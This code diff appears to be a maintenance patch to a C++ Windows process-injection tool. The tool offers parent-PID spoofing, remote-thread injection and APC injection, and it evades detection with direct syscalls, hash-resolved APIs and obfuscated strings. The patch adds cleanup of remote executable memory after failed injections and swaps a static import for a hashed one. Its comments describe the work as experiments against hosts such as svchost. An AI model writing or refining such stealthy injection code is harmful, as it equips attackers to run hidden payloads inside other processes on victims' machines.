@@ -73,7 +73,11 @@ BOOL SpawnWithPPID(const wchar_t* targetPath, DWORD parentPid,
         nullptr, nullptr,
         &si.StartupInfo, &pi);
 
-    DeleteProcThreadAttributeList(attrList);
+    // Use the hash-resolved pointer, not the static import: every other
+    // kernel32 call in this function goes through HASHPROC and _Delete...
+    // was already fetched and null-checked above, so the plain import here was
+    // both an inconsistency and an unnecessary load-time dependency.
+    _DeleteProcThreadAttributeList(attrList);
     CloseHandle(hParent);
 
     if (!ok) return FALSE;
@@ -108,6 +112,18 @@ static void CloseTarget(HANDLE h) {
     if (!h) return;
     if (g_Syscalls.NtClose) g_Syscalls.NtClose(h);
     else CloseHandle(h);
+}
+
+// Release a remote allocation we no longer intend to use.
+// SyscallTable has no NtFreeVirtualMemory, and adding an SSN entry is out of
+// scope for a leak fix, so this goes through kernel32 - the same fallback style
+// already used for VirtualAllocEx / WriteProcessMemory / VirtualProtectEx
+// throughout this file. Without it, every failed attempt permanently stains
+// committed memory in the target: repeat a failing inject against svchost a
+// few hundred times and the experiment changes the host it is measuring.
+static void FreeTarget(HANDLE hProc, PVOID base) {
+    if (!hProc || !base) return;
+    VirtualFreeEx(hProc, base, 0, MEM_RELEASE);
 }
 
 static HANDLE CreateRemoteThreadFallback(HANDLE hProc, PVOID startAddr) {
@@ -150,10 +166,10 @@ BOOL InjectRemoteProcess(DWORD pid, const BYTE* payload,
     SIZE_T written = 0;
     if (g_Syscalls.NtWriteVirtualMemory) {
         NTSTATUS st = g_Syscalls.NtWriteVirtualMemory(hProc, base, (PVOID)payload, payloadSize, &written);
-        if (st != 0 || written != payloadSize) { CloseTarget(hProc); return FALSE; }
+        if (st != 0 || written != payloadSize) { FreeTarget(hProc, base); CloseTarget(hProc); return FALSE; }
     } else {
         if (!WriteProcessMemory(hProc, base, payload, payloadSize, &written) || written != payloadSize) {
-            CloseTarget(hProc); return FALSE;
+            FreeTarget(hProc, base); CloseTarget(hProc); return FALSE;
         }
     }
 
@@ -161,17 +177,17 @@ BOOL InjectRemoteProcess(DWORD pid, const BYTE* payload,
     if (g_Syscalls.NtProtectVirtualMemory) {
         ULONG oldProt = 0;
         NTSTATUS st = g_Syscalls.NtProtectVirtualMemory(hProc, &base, &region, PAGE_EXECUTE_READ, &oldProt);
-        if (st != 0) { CloseTarget(hProc); return FALSE; }
+        if (st != 0) { FreeTarget(hProc, base); CloseTarget(hProc); return FALSE; }
     } else {
         DWORD oldProt = 0;
         if (!VirtualProtectEx(hProc, base, payloadSize, PAGE_EXECUTE_READ, &oldProt)) {
-            CloseTarget(hProc); return FALSE;
+            FreeTarget(hProc, base); CloseTarget(hProc); return FALSE;
         }
     }
 
     // 5. Create remote thread
     HANDLE hThread = CreateRemoteThreadFallback(hProc, base);
-    if (!hThread) { CloseTarget(hProc); return FALSE; }
+    if (!hThread) { FreeTarget(hProc, base); CloseTarget(hProc); return FALSE; }
 
     if (hThreadOut) *hThreadOut = hThread;
     else            CloseTarget(hThread);
@@ -208,26 +224,26 @@ BOOL InjectViaApc(DWORD pid, const BYTE* payload, SIZE_T payloadSize) {
     SIZE_T written = 0;
     if (g_Syscalls.NtWriteVirtualMemory) {
         if (g_Syscalls.NtWriteVirtualMemory(hProc, base, (PVOID)payload, payloadSize, &written) != 0 || written != payloadSize) {
-            CloseTarget(hProc); return FALSE;
+            FreeTarget(hProc, base); CloseTarget(hProc); return FALSE;
         }
     } else if (!WriteProcessMemory(hProc, base, payload, payloadSize, &written) || written != payloadSize) {
-        CloseTarget(hProc); return FALSE;
+        FreeTarget(hProc, base); CloseTarget(hProc); return FALSE;
     }
 
     if (g_Syscalls.NtProtectVirtualMemory) {
         ULONG oldProt = 0;
         if (g_Syscalls.NtProtectVirtualMemory(hProc, &base, &region, PAGE_EXECUTE_READ, &oldProt) != 0) {
-            CloseTarget(hProc); return FALSE;
+            FreeTarget(hProc, base); CloseTarget(hProc); return FALSE;
         }
     } else {
         DWORD oldProt = 0;
         if (!VirtualProtectEx(hProc, base, payloadSize, PAGE_EXECUTE_READ, &oldProt)) {
-            CloseTarget(hProc); return FALSE;
+            FreeTarget(hProc, base); CloseTarget(hProc); return FALSE;
         }
     }
 
     auto hKernel32 = GetModuleHandleA(XS("kernel32.dll"));
-    if (!hKernel32) { CloseTarget(hProc); return FALSE; }
+    if (!hKernel32) { FreeTarget(hProc, base); CloseTarget(hProc); return FALSE; }
 
     auto _CreateToolhelp32Snapshot = HASHPROC(hKernel32, CreateToolhelp32Snapshot);
     auto _Thread32First = HASHPROC(hKernel32, Thread32First);
@@ -236,11 +252,11 @@ BOOL InjectViaApc(DWORD pid, const BYTE* payload, SIZE_T payloadSize) {
     auto _CloseHandle = HASHPROC(hKernel32, CloseHandle);
 
     if (!_CreateToolhelp32Snapshot || !_Thread32First || !_Thread32Next || !_OpenThread || !_CloseHandle) {
-        CloseTarget(hProc); return FALSE;
+        FreeTarget(hProc, base); CloseTarget(hProc); return FALSE;
     }
 
     HANDLE snap = _CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
-    if (snap == INVALID_HANDLE_VALUE) { CloseTarget(hProc); return FALSE; }
+    if (snap == INVALID_HANDLE_VALUE) { FreeTarget(hProc, base); CloseTarget(hProc); return FALSE; }
 
     THREADENTRY32 te = {};
     te.dwSize = sizeof(te);
@@ -273,6 +289,10 @@ BOOL InjectViaApc(DWORD pid, const BYTE* payload, SIZE_T payloadSize) {
     }
 
     _CloseHandle(snap);
+    // No thread accepted the APC, so the region is dead on arrival in the
+    // target. Releasing it here is what keeps a failed experiment from leaving
+    // RX memory mapped into the host process.
+    if (!queued) FreeTarget(hProc, base);
     CloseTarget(hProc);
     return queued;
 }
